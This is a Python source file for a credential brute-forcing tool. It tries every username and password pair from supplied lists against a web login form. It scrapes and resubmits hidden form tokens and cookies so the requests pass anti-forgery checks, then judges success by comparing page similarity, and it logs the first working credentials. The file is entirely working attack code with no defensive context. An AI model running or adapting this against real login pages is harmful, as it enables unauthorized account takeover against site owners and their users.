import logging
import sys
import requests
from bs4 import BeautifulSoup
import ssl
from html_similarity import style_similarity, structural_similarity, similarity
from requests_html import HTMLSession


def brute(parameters):
    """
    sends all combinations for usernames and passwords to the attack function on the login page
    """

    for username in parameters["Usernames"]:
        parameters["username"] = username.strip()
        for password in parameters["Passwords"]:
            parameters["password"] = password.strip()
            attack(parameters)


def attack(content):
    """
    create a packet containing fake headers and the payload(username,password) and submit it to the server
    """

    if content["type"] == "javascript":
        session = HTMLSession()
        res = session.get(content["url"])
        res.html.render()
        body = res.html.html
    else:
        res = requests.get(content["url"])
        body = res.text

    soup = BeautifulSoup(body, "html.parser")

    payload = content["req_body"]
    cookies = res.cookies
    payload[content["user_param"]] = content["username"]
    payload[content["password_param"]] = content["password"]

    for token in payload:
        if token != content["user_param"] and token != content["password_param"]:
            inputs = soup.find("input", {"name": token})
            payload[token] = inputs["value"]

    payload, cookies = change_cookiesToken(cookies, payload)

    logging.debug("[+ payload]: " + str(payload))

    # if content["method"] == "post":

    if content["req_body_type"] == "XML":
        pass

    elif content["req_body_type"] == "JSON":
        resp = requests.post(content["url"], json=payload, cookies=cookies)

    elif content["req_body_type"] == "multipart":
        for param in payload:
            payload[param] = (None, payload[param])
        resp = requests.post(content["url"], files=payload, cookies=cookies)

    else:
        resp = requests.post(content["url"], data=payload, cookies=cookies)

    # else:
    #     resp = requests.get(content["action"] + "/" + payload, headers=headers)

    print(resp.status_code)

    if check_login(resp, res):
        logging.info(
            "login successfull\n\nusername: "
            + content["username"]
            + "\npassword: "
            + content["password"]
        )

        sys.exit(1)


def check_login(content_1, content_2):
    """
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    """
    k = 0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (
        1 - k
    ) * style_similarity(content_1.text, content_2.text)

    if content_1.status_code >= 400:
        return False

    elif content_1.status_code == 201:
        return True

    elif similarity < 0.7:
        return True

    else:
        return False


########################################################################################


def change_cookiesToken(cookies_jar, req_body):
    cookies = {}
    for cookie in cookies_jar:
        cookies[cookie.name] = cookie.value

    for item in cookies.keys():
        if item[1:] in req_body:
            req_body[item[1:]] = cookies[item]
        if item in req_body:
            req_body[item] = cookies[item]
    if len(cookies) == 0:
        cookies = None

    return req_body, cookies
